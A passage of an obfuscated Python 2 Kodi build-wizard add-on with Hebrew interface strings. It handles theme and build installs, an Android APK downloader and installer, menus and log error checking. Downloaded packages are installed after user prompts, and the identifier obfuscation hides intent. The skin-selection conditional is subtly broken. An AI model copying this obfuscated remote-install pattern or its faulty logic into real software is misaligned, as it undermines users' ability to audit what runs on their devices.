			OO0O0000O0O0OO000 =OO0OOO0OOO00O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4564
			if not wiz .workingURL (O00OO0O0OOO0OOO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4565
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4566
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4567
			OOO0OO0O000O0O0OO =os .path .join (PACKAGES ,'%s.zip'%OO0O0000O0O0OO000 )#line:4568
			try :os .remove (OOO0OO0O000O0O0OO )#line:4569
			except :pass #line:4570
			downloader .download (O00OO0O0OOO0OOO0O ,OOO0OO0O000O0O0OO ,DP )#line:4571
			xbmc .sleep (1000 )#line:4572
			DP .update (0 ,"","Installing %s "%OO0OOO0OOO00O00O0 )#line:4573
			OO00O000OOOO0OO0O =False #line:4574
			if url not in ["fresh","normal"]:#line:4575
				OO00O000OOOO0OO0O =testTheme (OOO0OO0O000O0O0OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4576
				O0O000O000O0OO0OO =testGui (OOO0OO0O000O0O0OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4577
				if OO00O000OOOO0OO0O ==True :#line:4578
					wiz .lookandFeelData ('save')#line:4579
					O0OO0000OO00O000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4580
					OOO0O0OOO0O0O00O0 =xbmc .getSkinDir ()#line:4581
					skinSwitch .swapSkins (O0OO0000OO00O000O )#line:4583
					OO0OOO00O0OOO0OO0 =0 #line:4584
					xbmc .sleep (1000 )#line:4585
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OOO00O0OOO0OO0 <150 :#line:4586
						OO0OOO00O0OOO0OO0 +=1 #line:4587
						xbmc .sleep (1000 )#line:4588
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4589
						wiz .ebi ('SendClick(11)')#line:4590
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4591
					xbmc .sleep (1000 )#line:4592
			OO00OOOO0O000O00O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4593
			DP .update (0 ,OO00OOOO0O000O00O ,'','אנא המתן')#line:4594
			O0OOOO0OO00OO00O0 ,OOO0O0OOOO0OO0O0O ,OO0O000O00O0O00O0 =extract .all (OOO0OO0O000O0O0OO ,HOME ,DP ,title =OO00OOOO0O000O00O )#line:4595
			wiz .setS ('buildtheme',theme )#line:4596
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OOOO0OO00OO00O0 ,OOO0O0OOOO0OO0O0O ))#line:4597
			DP .close ()#line:4598
			if url not in ["fresh","normal"]:#line:4599
				wiz .forceUpdate ()#line:4600
				if KODIV >=17 :wiz .kodi17Fix ()#line:4601
				if O0O000O000O0OO0OO ==True :#line:4602
					wiz .lookandFeelData ('save')#line:4603
					wiz .defaultSkin ()#line:4604
					OOO0O0OOO0O0O00O0 =wiz .getS ('defaultskin')#line:4605
					skinSwitch .swapSkins (OOO0O0OOO0O0O00O0 )#line:4606
					OO0OOO00O0OOO0OO0 =0 #line:4607
					xbmc .sleep (1000 )#line:4608
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OOO00O0OOO0OO0 <150 :#line:4609
						OO0OOO00O0OOO0OO0 +=1 #line:4610
						xbmc .sleep (1000 )#line:4611
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4613
						wiz .ebi ('SendClick(11)')#line:4614
					wiz .lookandFeelData ('restore')#line:4615
				elif OO00O000OOOO0OO0O ==True :#line:4616
					skinSwitch .swapSkins (OOO0O0OOO0O0O00O0 )#line:4617
					OO0OOO00O0OOO0OO0 =0 #line:4618
					xbmc .sleep (1000 )#line:4619
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OOO00O0OOO0OO0 <150 :#line:4620
						OO0OOO00O0OOO0OO0 +=1 #line:4621
						xbmc .sleep (1000 )#line:4622
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4624
						wiz .ebi ('SendClick(11)')#line:4625
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4626
					wiz .lookandFeelData ('restore')#line:4627
				else :#line:4628
					wiz .ebi ("ReloadSkin()")#line:4629
					xbmc .sleep (1000 )#line:4630
					wiz .ebi ("Container.Refresh")#line:4631
		else :#line:4632
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4633
def skin_homeselect ():#line:4637
	try :#line:4639
		OO0OOOOOOOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4640
		OO0000000O0OOOO00 =open (OO0OOOOOOOO0OO0O0 ,'r')#line:4642
		OOO0O0O00000OO0OO =OO0000000O0OOOO00 .read ()#line:4643
		OO0000000O0OOOO00 .close ()#line:4644
		OOO0OOOO000O0OOO0 ='<setting id="FirstRunSetup" type="bool(.+?)/setting>'#line:4645
		OOOO000000OO000OO =re .compile (OOO0OOOO000O0OOO0 ).findall (OOO0O0O00000OO0OO )[0 ]#line:4646
		OO0000000O0OOOO00 =open (OO0OOOOOOOO0OO0O0 ,'w')#line:4647
		OO0000000O0OOOO00 .write (OOO0O0O00000OO0OO .replace ('<setting id="FirstRunSetup" type="bool%s/setting>'%OOOO000000OO000OO ,'<setting id="FirstRunSetup" type="bool"></setting>'))#line:4648
		OO0000000O0OOOO00 .close ()#line:4649
	except :#line:4650
		pass #line:4651
def skin_lower ():#line:4654
	OOOO000OOOOOOOOOO =(ADDON .getSetting ("lower"))#line:4655
	if OOOO000OOOOOOOOOO =='true':#line:4656
		try :#line:4659
			O000000OOO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4660
			OO0OOOO0OOO00O00O =open (O000000OOO0O00OO0 ,'r')#line:4662
			OO00OO00OOO0000O0 =OO0OOOO0OOO00O00O .read ()#line:4663
			OO0OOOO0OOO00O00O .close ()#line:4664
			O0O0000OOOOO0O0O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4665
			OOO0OOOOO0000OOO0 =re .compile (O0O0000OOOOO0O0O0 ).findall (OO00OO00OOO0000O0 )[0 ]#line:4666
			OO0OOOO0OOO00O00O =open (O000000OOO0O00OO0 ,'w')#line:4667
			OO0OOOO0OOO00O00O .write (OO00OO00OOO0000O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOO0OOOOO0000OOO0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4668
			OO0OOOO0OOO00O00O .close ()#line:4669
		except :#line:4735
			pass #line:4736
def thirdPartyInstall (OOO0OOO0OOO00O0OO ,O0000O0000OOOOOO0 ):#line:4738
	if not wiz .workingURL (O0000O0000OOOOOO0 ):#line:4739
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4740
	O0000OOO000OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO0OOO00O0OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4741
	if O0000OOO000OOO0OO ==1 :#line:4742
		freshStart ('third',True )#line:4743
	wiz .clearS ('build')#line:4744
	O00O0O000O00000O0 =OOO0OOO0OOO00O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4745
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4746
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O0OO ),'','אנא המתן')#line:4747
	O0OO0OO0OOO0O0O00 =os .path .join (PACKAGES ,'%s.zip'%O00O0O000O00000O0 )#line:4748
	try :os .remove (O0OO0OO0OOO0O0O00 )#line:4749
	except :pass #line:4750
	downloader .download (O0000O0000OOOOOO0 ,O0OO0OO0OOO0O0O00 ,DP )#line:4751
	xbmc .sleep (1000 )#line:4752
	O0O0O00O0O0000OO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O0OO )#line:4753
	DP .update (0 ,O0O0O00O0O0000OO0 ,'','אנא המתן')#line:4754
	O000O0000O00O0000 ,OOOO000O0O0OOOOO0 ,O0OOO0OO0O0O0O000 =extract .all (O0OO0OO0OOO0O0O00 ,HOME ,DP ,title =O0O0O00O0O0000OO0 )#line:4755
	if int (float (O000O0000O00O0000 ))>0 :#line:4756
		wiz .fixmetas ()#line:4757
		wiz .lookandFeelData ('save')#line:4758
		wiz .defaultSkin ()#line:4759
		wiz .setS ('installed','true')#line:4761
		wiz .setS ('extract',str (O000O0000O00O0000 ))#line:4762
		wiz .setS ('errors',str (OOOO000O0O0OOOOO0 ))#line:4763
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O000O0000O00O0000 ,OOOO000O0O0OOOOO0 ))#line:4764
		try :os .remove (O0OO0OO0OOO0O0O00 )#line:4765
		except :pass #line:4766
		if int (float (OOOO000O0O0OOOOO0 ))>0 :#line:4767
			OOOOOOOO0000O000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O0OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O000O0000O00O0000 ,'%',COLOR1 ,OOOO000O0O0OOOOO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4768
			if OOOOOOOO0000O000O :#line:4769
				if isinstance (OOOO000O0O0OOOOO0 ,unicode ):#line:4770
					O0OOO0OO0O0O0O000 =O0OOO0OO0O0O0O000 .encode ('utf-8')#line:4771
				wiz .TextBox (ADDONTITLE ,O0OOO0OO0O0O0O000 )#line:4772
	DP .close ()#line:4773
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4774
	if INSTALLMETHOD ==1 :O000O00OOOOOOOOOO =1 #line:4775
	elif INSTALLMETHOD ==2 :O000O00OOOOOOOOOO =0 #line:4776
	else :O000O00OOOOOOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4777
	if O000O00OOOOOOOOOO ==1 :wiz .reloadFix ()#line:4778
	else :wiz .killxbmc (True )#line:4779
def testTheme (OO0000O0OOOOOO0OO ):#line:4781
	O00O00OO000O0000O =zipfile .ZipFile (OO0000O0OOOOOO0OO )#line:4782
	for OOO00O0OO0O000OO0 in O00O00OO000O0000O .infolist ():#line:4783
		if '/settings.xml'in OOO00O0OO0O000OO0 .filename :#line:4784
			return True #line:4785
	return False #line:4786
def testGui (O0O0O00OO0OOOOO00 ):#line:4788
	O0OOOOO0OO0OOO0O0 =zipfile .ZipFile (O0O0O00OO0OOOOO00 )#line:4789
	for O0O0O0OO000OO00O0 in O0OOOOO0OO0OOO0O0 .infolist ():#line:4790
		if '/guisettings.xml'in O0O0O0OO000OO00O0 .filename :#line:4791
			return True #line:4792
	return False #line:4793
def apkInstaller (O0000O0OO00OOOO00 ,O0O0O00O0O000OO00 ):#line:4795
	wiz .log (O0000O0OO00OOOO00 )#line:4796
	wiz .log (O0O0O00O0O000OO00 )#line:4797
	if wiz .platform ()=='android':#line:4798
		O0O0O0OOOO00O0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0OO00OOOO00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4799
		if not O0O0O0OOOO00O0OO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4800
		OO0OOOOOOO0O00OO0 =O0000O0OO00OOOO00 #line:4801
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4802
		if not wiz .workingURL (O0O0O00O0O000OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4803
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOOOOOO0O00OO0 ),'','אנא המתן')#line:4804
		O00000OOO0O0O0O00 =os .path .join (PACKAGES ,"%s.apk"%O0000O0OO00OOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4805
		try :os .remove (O00000OOO0O0O0O00 )#line:4806
		except :pass #line:4807
		downloader .download (O0O0O00O0O000OO00 ,O00000OOO0O0O0O00 ,DP )#line:4808
		xbmc .sleep (100 )#line:4809
		DP .close ()#line:4810
		notify .apkInstaller (O0000O0OO00OOOO00 )#line:4811
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O00000OOO0O0O0O00 +'")')#line:4812
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4813
def createMenu (OO0O0O0O000O00O00 ,OOO0OO00O000OOO00 ,O00O00OOO0OO0OO00 ):#line:4819
	if OO0O0O0O000O00O00 =='saveaddon':#line:4820
		OOO0O0OO0OOOOO00O =[]#line:4821
		O0O00OO0OO000O000 =urllib .quote_plus (OOO0OO00O000OOO00 .lower ().replace (' ',''))#line:4822
		OOOOOO0O0O000OOO0 =OOO0OO00O000OOO00 .replace ('Debrid','Real Debrid')#line:4823
		OOOOOO0O00OO0000O =urllib .quote_plus (O00O00OOO0OO0OO00 .lower ().replace (' ',''))#line:4824
		O00O00OOO0OO0OO00 =O00O00OOO0OO0OO00 .replace ('url','URL Resolver')#line:4825
		OOO0O0OO0OOOOO00O .append ((THEME2 %O00O00OOO0OO0OO00 .title (),' '))#line:4826
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Save %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4827
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Restore %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4828
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Clear %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4829
	elif OO0O0O0O000O00O00 =='save':#line:4830
		OOO0O0OO0OOOOO00O =[]#line:4831
		O0O00OO0OO000O000 =urllib .quote_plus (OOO0OO00O000OOO00 .lower ().replace (' ',''))#line:4832
		OOOOOO0O0O000OOO0 =OOO0OO00O000OOO00 .replace ('Debrid','Real Debrid')#line:4833
		OOOOOO0O00OO0000O =urllib .quote_plus (O00O00OOO0OO0OO00 .lower ().replace (' ',''))#line:4834
		O00O00OOO0OO0OO00 =O00O00OOO0OO0OO00 .replace ('url','URL Resolver')#line:4835
		OOO0O0OO0OOOOO00O .append ((THEME2 %O00O00OOO0OO0OO00 .title (),' '))#line:4836
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Register %s'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4837
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Save %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4838
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Restore %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4839
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Import %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4840
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Clear Addon %s Data'%OOOOOO0O0O000OOO0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O00OO0OO000O000 ,OOOOOO0O00OO0000O )))#line:4841
	elif OO0O0O0O000O00O00 =='install':#line:4842
		OOO0O0OO0OOOOO00O =[]#line:4843
		OOOOOO0O00OO0000O =urllib .quote_plus (O00O00OOO0OO0OO00 )#line:4844
		OOO0O0OO0OOOOO00O .append ((THEME2 %O00O00OOO0OO0OO00 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOOOOO0O00OO0000O )))#line:4845
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOOOOO0O00OO0000O )))#line:4846
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOOOOO0O00OO0000O )))#line:4847
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOOOOO0O00OO0000O )))#line:4848
		OOO0O0OO0OOOOO00O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOOOOO0O00OO0000O )))#line:4849
	OOO0O0OO0OOOOO00O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4850
	return OOO0O0OO0OOOOO00O #line:4851
def toggleCache (OOOOO00O0O0000OOO ):#line:4853
	OOO0O0OO0OO00O00O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4854
	O00O0O0OO0O0O0O00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4855
	if OOOOO00O0O0000OOO in ['true','false']:#line:4856
		for OO0OO0O0O0OOOO0O0 in OOO0O0OO0OO00O00O :#line:4857
			wiz .setS (OO0OO0O0O0OOOO0O0 ,OOOOO00O0O0000OOO )#line:4858
	else :#line:4859
		if not OOOOO00O0O0000OOO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4860
			try :#line:4861
				OO0OO0O0O0OOOO0O0 =O00O0O0OO0O0O0O00 [OOO0O0OO0OO00O00O .index (OOOOO00O0O0000OOO )]#line:4862
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0OO0O0O0OOOO0O0 ))#line:4863
			except :#line:4864
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOOOO00O0O0000OOO ))#line:4865
		else :#line:4866
			O000O000O0OO00O0O ='true'if wiz .getS (OOOOO00O0O0000OOO )=='false'else 'false'#line:4867
			wiz .setS (OOOOO00O0O0000OOO ,O000O000O0OO00O0O )#line:4868
def playVideo (OO00OOO0O0O00O00O ):#line:4870
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO00OOO0O0O00O00O )#line:4871
	if 'watch?v='in OO00OOO0O0O00O00O :#line:4872
		O00OOO000O0O0OO0O ,OOOO0OO0O00OO000O =OO00OOO0O0O00O00O .split ('?')#line:4873
		O00O00OO00O00O0O0 =OOOO0OO0O00OO000O .split ('&')#line:4874
		for OOOOO0O00OO0000OO in O00O00OO00O00O0O0 :#line:4875
			if OOOOO0O00OO0000OO .startswith ('v='):#line:4876
				OO00OOO0O0O00O00O =OOOOO0O00OO0000OO [2 :]#line:4877
				break #line:4878
			else :continue #line:4879
	elif 'embed'in OO00OOO0O0O00O00O or 'youtu.be'in OO00OOO0O0O00O00O :#line:4880
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO00OOO0O0O00O00O )#line:4881
		O00OOO000O0O0OO0O =OO00OOO0O0O00O00O .split ('/')#line:4882
		if len (O00OOO000O0O0OO0O [-1 ])>5 :#line:4883
			OO00OOO0O0O00O00O =O00OOO000O0O0OO0O [-1 ]#line:4884
		elif len (O00OOO000O0O0OO0O [-2 ])>5 :#line:4885
			OO00OOO0O0O00O00O =O00OOO000O0O0OO0O [-2 ]#line:4886
	wiz .log ("YouTube URL: %s"%OO00OOO0O0O00O00O )#line:4887
	yt .PlayVideo (OO00OOO0O0O00O00O )#line:4888
def viewLogFile ():#line:4890
	OO0OOOO0O0OOO00O0 =wiz .Grab_Log (True )#line:4891
	O0O000O0O00OO00O0 =wiz .Grab_Log (True ,True )#line:4892
	OOOO00OO00O00O000 =0 ;O00000OO0OO0OO000 =OO0OOOO0O0OOO00O0 #line:4893
	if not O0O000O0O00OO00O0 ==False and not OO0OOOO0O0OOO00O0 ==False :#line:4894
		OOOO00OO00O00O000 =DIALOG .select (ADDONTITLE ,["View %s"%OO0OOOO0O0OOO00O0 .replace (LOG ,""),"View %s"%O0O000O0O00OO00O0 .replace (LOG ,"")])#line:4895
		if OOOO00OO00O00O000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4896
	elif OO0OOOO0O0OOO00O0 ==False and O0O000O0O00OO00O0 ==False :#line:4897
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4898
		return #line:4899
	elif not OO0OOOO0O0OOO00O0 ==False :OOOO00OO00O00O000 =0 #line:4900
	elif not O0O000O0O00OO00O0 ==False :OOOO00OO00O00O000 =1 #line:4901
	O00000OO0OO0OO000 =OO0OOOO0O0OOO00O0 if OOOO00OO00O00O000 ==0 else O0O000O0O00OO00O0 #line:4903
	O0O00O0OOO0000OOO =wiz .Grab_Log (False )if OOOO00OO00O00O000 ==0 else wiz .Grab_Log (False ,True )#line:4904
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O00000OO0OO0OO000 ),O0O00O0OOO0000OOO )#line:4906
def errorChecking (log =None ,count =None ,all =None ):#line:4908
	if log ==None :#line:4909
		OO000O0O00OO0OO0O =wiz .Grab_Log (True )#line:4910
		O0OOOO000OOOOO0O0 =wiz .Grab_Log (True ,True )#line:4911
		if not O0OOOO000OOOOO0O0 ==False and not OO000O0O00OO0OO0O ==False :#line:4912
			OO0000000OOO0OO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO000O0O00OO0OO0O .replace (LOG ,""),errorChecking (OO000O0O00OO0OO0O ,True ,True )),"View %s: %s error(s)"%(O0OOOO000OOOOO0O0 .replace (LOG ,""),errorChecking (O0OOOO000OOOOO0O0 ,True ,True ))])#line:4913
			if OO0000000OOO0OO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4914
		elif OO000O0O00OO0OO0O ==False and O0OOOO000OOOOO0O0 ==False :#line:4915
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4916
			return #line:4917
		elif not OO000O0O00OO0OO0O ==False :OO0000000OOO0OO00 =0 #line:4918
		elif not O0OOOO000OOOOO0O0 ==False :OO0000000OOO0OO00 =1 #line:4919
		log =OO000O0O00OO0OO0O if OO0000000OOO0OO00 ==0 else O0OOOO000OOOOO0O0 #line:4920
	if log ==False :#line:4921
		if count ==None :#line:4922
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4923
			return False #line:4924
		else :#line:4925
			return 0 #line:4926
	else :#line:4927
		if os .path .exists (log ):#line:4928
			OO00O0O00OOO00O0O =open (log ,mode ='r');OO0OOO00OO0000000 =OO00O0O00OOO00O0O .read ().replace ('\n','').replace ('\r','');OO00O0O00OOO00O0O .close ()#line:4929
			O000OOOOO00O0000O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO0OOO00OO0000000 )#line:4930
			if not count ==None :#line:4931
				if all ==None :#line:4932
					OO00O0OOOOO0000OO =0 #line:4933
					for O0O0OOO0OO000O0OO in O000OOOOO00O0000O :#line:4934
						if ADDON_ID in O0O0OOO0OO000O0OO :OO00O0OOOOO0000OO +=1 #line:4935
					return OO00O0OOOOO0000OO #line:4936
				else :return len (O000OOOOO00O0000O )#line:4937
			if len (O000OOOOO00O0000O )>0 :#line:4938
				OO00O0OOOOO0000OO =0 ;OO0O0O0O0OO0OO0O0 =""#line:4939
				for O0O0OOO0OO000O0OO in O000OOOOO00O0000O :#line:4940
					if all ==None and not ADDON_ID in O0O0OOO0OO000O0OO :continue #line:4941
					else :#line:4942
						OO00O0OOOOO0000OO +=1 #line:4943
						OO0O0O0O0OO0OO0O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO00O0OOOOO0000OO ,O0O0OOO0OO000O0OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4944
				if OO00O0OOOOO0000OO >0 :#line:4945
					wiz .TextBox (ADDONTITLE ,OO0O0O0O0OO0OO0O0 )#line:4946
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4947
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4948
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4949
ACTION_PREVIOUS_MENU =10 #line:4951
ACTION_NAV_BACK =92 #line:4952
ACTION_MOVE_LEFT =1 #line:4953
ACTION_MOVE_RIGHT =2 #line:4954
ACTION_MOVE_UP =3 #line:4955
ACTION_MOVE_DOWN =4 #line:4956
ACTION_MOUSE_WHEEL_UP =104 #line:4957
ACTION_MOUSE_WHEEL_DOWN =105 #line:4958
ACTION_MOVE_MOUSE =107 #line:4959
ACTION_SELECT_ITEM =7 #line:4960
ACTION_BACKSPACE =110 #line:4961
ACTION_MOUSE_LEFT_CLICK =100 #line:4962
ACTION_MOUSE_LONG_CLICK =108 #line:4963
def LogViewer (default =None ):#line:4965
	class OOO0OO00O0O0O0OO0 (xbmcgui .WindowXMLDialog ):#line:4966
		def __init__ (OO00OOOO0O0O00OO0 ,*OOO0000OOOOO0O000 ,**O0OO0OOO0OOO0O0O0 ):#line:4967
			OO00OOOO0O0O00OO0 .default =O0OO0OOO0OOO0O0O0 ['default']#line:4968
